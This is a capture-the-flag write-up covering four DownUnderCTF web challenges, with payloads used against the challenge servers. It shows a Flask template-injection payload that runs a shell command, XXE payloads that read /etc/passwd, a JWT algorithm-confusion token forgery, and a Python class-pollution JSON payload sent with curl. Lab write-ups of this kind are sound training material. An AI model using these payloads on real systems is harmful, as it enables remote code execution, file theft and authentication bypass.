* * *
![image](https://github.com/user-attachments/assets/744acab1-abef-48c8-babd-c61ed1646cc9)

* * *

### **Challenges**

### **Web**

-     Parrot the emu
-     Zoo feedback form
-     Co2
-     I am Confusion

---------------------------------

### Web

### Challenge: Parrot the emu

----------------------------------

![image](https://github.com/user-attachments/assets/8f1e8226-6491-4ec6-8705-30129f0adc5e)


- The index route `/` is the vulnerable part of the web app's code. The index page passes the `user_input` variable  to  the `render_template_string()` which is vulnerable to server side template injection in flask web apps' code.It allows an attacker to inject code into templaates.

      @app.route('/', methods=['GET', 'POST'])
      def vulnerable():
          chat_log = []
      
          if request.method == 'POST':
              user_input = request.form.get('user_input')
              try:
                  result = render_template_string(user_input)
              except Exception as e:
                  result = str(e)
      
              chat_log.append(('User', user_input))
              chat_log.append(('Emu', result))
          
          return render_template('index.html', chat_log=chat_log)

- Testing our little fact by executing \{\{7*7\}\},the server returned the value `49`

![image](https://github.com/user-attachments/assets/f30a52a9-2651-4f55-8e01-c577b0da806b)

### RCE

- I used the payload \{\{''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()\}\} to access the classes available

![image](https://github.com/user-attachments/assets/a4b3b2a7-ca56-4dbd-812d-d42543db5721)

- After checking the list of available classes, I got shell command access with class `subprocess.Popen` on index `213`

       Payload: ''.__class__.__base__.__subclasses__()[213]

![image](https://github.com/user-attachments/assets/ce45878b-c7f2-4b2a-9005-6784a09b30a3)

### Reading the flag

- Flag payload

      Payload: ''.__class__.__base__.__subclasses__()[213]("cat flag",shell=True,stdout=-1).communicate()

![image](https://github.com/user-attachments/assets/9312e1e3-ace1-42cc-8fff-53d6714c7bda)

- Flag-:```DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}```

---------------------------------------

### Challenge: Zoo Feedback form

---------------------------------------

![image](https://github.com/user-attachments/assets/25cbd005-207a-423c-b2e1-9403eb6efbb7)

- After reviewing the source code, I noticed that `resolve_entities` was set to `True` which forces lxml parser to resolve external entities. In a whole, the main vulnerability is `XML External Entity Expansion` which allows an attacker to inject xml entities into a web application.

  Vulnerable Code:
            
            try:
               parser = etree.XMLParser(resolve_entities=True)

- Fix: Set resolve_entities to `False`

- I intercepted the request with burpsuite

![image](https://github.com/user-attachments/assets/4da48e9d-c2f3-42ca-92b1-aeb1e05ba5ac)

- I used this payload to read the `/etc/passwd` file

  Payload:

      <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
                  <root>
                 <feedback>
                  &example;
                 </feedback>
                  </root>

![image](https://github.com/user-attachments/assets/7451bb98-b2c6-47f4-8c3b-17f946a889f2)

- Then, I read the flag located at `/app/flag.txt`.

            <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/app/flag.txt"> ]>
                        <root>
                       <feedback>
                          &example;
                        </feedback>
                        </root>

![image](https://github.com/user-attachments/assets/ab20d730-43d0-48d2-99bd-f933e65dc8ee)

- Flag-:```DUCTF{emU_say$_he!!0_h0!@_ci@0}```
--------------------------

### Challenge: I am Confusion

--------------------------

![image](https://github.com/user-attachments/assets/9a30d811-d76a-4d40-9a0f-1dca3b2452ee)

- Source code:

                  // ascii art
                  const asciiArt = fs.readFileSync('ascii-art.txt', 'utf8');
                  
                  // algs
                  const verifyAlg = { algorithms: ['HS256','RS256'] }
                  const signAlg = { algorithm:'RS256' }
                  
                  // keys
                  // change these back once confirmed working
                  const privateKey = fs.readFileSync('keys/priv.key')
                  const publicKey = fs.readFileSync('keys/pubkeyrsa.pem')
                  const certificate = fs.readFileSync('keys/fullchain.pem')
                  
                  // middleware
                  app.use(express.static(__dirname + '/public'));
                  app.use(express.urlencoded({extended:false}))
                  app.use(cookieParser())
                  
                  app.get('/', (req, res) => {
                    res.status(302).redirect('/login.html')
                  });
                  
                  app.post('/login', (req,res) => {
                    var username = req.body.username
                    var password = req.body.password
                  
                    if (/^admin$/i.test(username)) {
                      res.status(400).send("Username taken");
                      return;
                    }
                  
                    if (username && password){
                      var payload = { user: username };
                      var cookie_expiry =  { maxAge: 900000, httpOnly: true }
                  
                      const jwt_token = jwt.sign(payload, privateKey, signAlg)
                  
                      res.cookie('auth', jwt_token, cookie_expiry)
                      res.redirect(302, '/public.html')
                    } else {
                      res.status(404).send("404 uh oh")
                    }
                  });
                  
                  app.get('/admin.html', (req, res) => {
                    var cookie = req.cookies;
                    jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
                      if (err) {
                        res.status(403).send("403 -.-");
                      } else if (decoded_jwt['user'] == 'admin') {
                        res.sendFile(path.join(__dirname, 'admin.html')) // flag!
                      } else {
                        res.status(403).sendFile(path.join(__dirname, '/public/hehe.html'))
                      }
                    })
                  })
                  
                  app.get('/public.html', (req, res) => {
                    var cookie = req.cookies;
                    jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
                      if (err) {
                        res.status(302).redirect('/login.html');
                      } else if (decoded_jwt['user']) {
                        res.sendFile(path.join(__dirname, 'public.html'))
                      }
                    })
                  })

- The challenge's implements the RS256 but it is vulnerable to `JWT Confusion Attack` which occurs when a server allows the use of algorithm `RS256` and `HS256` in verifying a `Json Web Token`. A `RS256` algorithm applies the asymmetric form of encryption that encrypts with the public key and can only be decrypted with the private key. `Hs256` on the other hand applies the symmetric form of encryption requiring only the public key for encryption. If the jwt `'alg'` header is set `hs256`, the server decrypts only with the public key. If an attacker can derive the public key, he can decrypt the jwt token and edit it for malicious purposes.

### Vulnerable code snippets

- The code verifies the algorithm of a token by comparing with value `hs256 and rs256` and signs the token only with `rs256`

        // algs
      const verifyAlg = { algorithms: ['HS256','RS256'] }
      const signAlg = { algorithm:'RS256' }
      
- The code verifies the alg by comparing the `alg` value with the `verifyAlg` variable and not the `signAlg` variable

      jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt)

### Exploitation

- I got a script from [Silent Signal](https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py) to generate the public key and forge an `hs256` token. I tweaked the code to generate values for my script.[Tweaked Script](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/DownUnderCTF/scripts/Confusion/jwt_forgery.py)

### Script idea

- Create 2 accounts and grab the cookies
- Pass the 2 cookies to the `jwt_forgery()` function to generate the public keys
- Send the generated keys to `forge_hmac()` function with the username `admin` to generate an admin cookie
- Check if the cookie works with the admin page and grab the flag

- Link to my [POC](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/DownUnderCTF/scripts/Confusion/confusionexploit.py)

### Script Output:
- Output:
            
            ❯ ./confusionexploit.py
            [+] Cookies generated
            [+]Generating public keys
            [+] Testing public key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFyanliTk5TM1NUOFZmVW9BSWh2bApaSnROczl0ZzBLMitiQXB5TnRjV3ZHRC9iUkVKbkkxcWxjMEpPb0Y4Wjh6T0VTZ3BKb3JnU0hzUEg2ditoZ09lCjNCSU5oT3RocmlFYmFtaDdHVkdJOWNRR1NGREhuY0RpdWFBRmNtTVl0K09HaUcyd0l6S0o5bmhyNlF4QTVrM0sKQVEvNXhBTU1VSzhvQU9MVUcxSlFZemZDa3RHcGNpU0h5OTAxMmptaHN6VVhvSjVNUXBCbnlGVkQ2WWEzWU0vMQpwV1dXU1ZNeGdsSHY2VjB2SEFqODc4K09GTFlCV3A1bGRXekF0Ri8wZjdYREtVMEpxaDRmRVNmdlBRSjVCL0hECms4V016aFdORVl4czdsWkF2SnFtMGhjdERnQlM5aTFXajk4NXQrTGF6dW5xckhMUXNJdTB5UG9TbjNXRllJKzkKWXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
            [+]Cookie: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFkbWluIiwgImV4cCI6IDE3MjMyNDg4ODd9.sjeEQ_JGXzchIhyh3UZLLTm52-zpqgZ_OnEmhanSwDw
            [+] Incorrect key
            [+] Testing public key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXJqeWJOTlMzU1Q4VmZVb0FJaHZsWkp0TnM5dGcwSzIrYkFweU50Y1d2R0QvYlJFSm5JMXEKbGMwSk9vRjhaOHpPRVNncEpvcmdTSHNQSDZ2K2hnT2UzQklOaE90aHJpRWJhbWg3R1ZHSTljUUdTRkRIbmNEaQp1YUFGY21NWXQrT0dpRzJ3SXpLSjluaHI2UXhBNWszS0FRLzV4QU1NVUs4b0FPTFVHMUpRWXpmQ2t0R3BjaVNICnk5MDEyam1oc3pVWG9KNU1RcEJueUZWRDZZYTNZTS8xcFdXV1NWTXhnbEh2NlYwdkhBajg3OCtPRkxZQldwNWwKZFd6QXRGLzBmN1hES1UwSnFoNGZFU2Z2UFFKNUIvSERrOFdNemhXTkVZeHM3bFpBdkpxbTBoY3REZ0JTOWkxVwpqOTg1dCtMYXp1bnFySExRc0l1MHlQb1NuM1dGWUkrOVl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
            [+]Cookie: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFkbWluIiwgImV4cCI6IDE3MjMyNDg4ODl9.a6dUL0qY04yzPcatdphurQfPq4ltQ79tb1VN1uuBUos
            [+]Flag is DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}

- Flag-:```DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}```
  
----------------------------------------  

### Challenge: Co2

![image](https://github.com/user-attachments/assets/e8c4d915-d52e-41e2-bb90-8250587a609c)


### Vulnerable code:

- Vulnerable Code 1: `utils.merge()`

            def merge(src, dst):
                for k, v in src.items():
                    if hasattr(dst, '__getitem__'):
                        if dst.get(k) and type(v) == dict:
                            merge(v, dst.get(k))
                        else:
                            dst[k] = v
                    elif hasattr(dst, k) and type(v) == dict:
                        merge(v, getattr(dst, k))
                    else:
                        setattr(dst, k, v)

- The piece of code above  is vulnerable to [Python's Prototype Pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/) which allows an attacker to set special attributes of an object.

- Vulnerable code snippet 2:

            @app.route("/save_feedback", methods=["POST"])
            @login_required
            def save_feedback():
                data = json.loads(request.data)
                feedback = Feedback()
                # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
                merge(data, feedback)
                save_feedback_to_disk(feedback)
                return jsonify({"success": "true"}), 200

- The route `/save_feedback` receives `application/json` data and passes it to the `merge` function to handle it.This is the point that we will inject our payload.
- The route `/get_flag` checks if variable `flag` is set to true and sends the flag.The main objective is to use `Python Prototype Pollution` to set flag to true.

            @app.route("/get_flag")
            @login_required
            def get_flag():
                if flag == "true":
                    return "DUCTF{NOT_THE_REAL_FLAG}"
                else:
                    return "Nope"

- Payload to get the flag-:```{"__class__":{"__init__":{"__globals__":{"flag":"true"}}}}```
  
### Exploitation

- Setting the flag to "true" with `curl`

      ❯ curl https://web-co2-63345e7db7737f2d.2024.ductf.dev/save_feedback -H "Cookie: session=.eJwlzjsOwyAQBcC7UKdgH-wHX8YCllXS2nEV5e6xlHqa-aQ9jnU-0_Y-rvVI-8vTltQ650nNwqxPQx6111FyjC7mQm6hKKOgSyEY11mWaraGm0ODI4QQrUnj8NooL7eqrCAwcoMSfJXJlCkcNCakC9tEFQnldEeucx3_DdL3B0tPLXg.ZrfRhQ.Pi_MCrfl3qdxciMt1p5LsUeEd0k" -H "Content-Type: application/json" -d '{"__class__":{"__init__":{"__globals__":{"flag":"true"}}}}'
      {"success":"true"}

- Getting the flag with `curl`

      ❯ curl https://web-co2-63345e7db7737f2d.2024.ductf.dev/get_flag -H "Cookie: session=.eJwlzjsOwyAQBcC7UKdgH-wHX8YCllXS2nEV5e6xlHqa-aQ9jnU-0_Y-rvVI-8vTltQ650nNwqxPQx6111FyjC7mQm6hKKOgSyEY11mWaraGm0ODI4QQrUnj8NooL7eqrCAwcoMSfJXJlCkcNCakC9tEFQnldEeucx3_DdL3B0tPLXg.ZrfRhQ.Pi_MCrfl3qdxciMt1p5LsUeEd0k" 
      DUCTF{_cl455_p0lluti0n_ftw_}%

- Flag-:```DUCTF{_cl455_p0lluti0n_ftw_}```

--------------------------

--------------------------
### References:
--------------------------

- Lxml.etree's XXE Attack: [Codeql's blog](https://codeql.github.com/codeql-query-help/python/py-xxe/)
- XXE's details: [Hacktrickz](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- Silent-signal's forgery script: [Silent Signal](https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py)
- Jwt Confusion Attack: [Portswigger](https://portswigger.net/web-security/jwt/algorithm-confusion)
- Python Prototype Pollution: [abdlrah33m](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
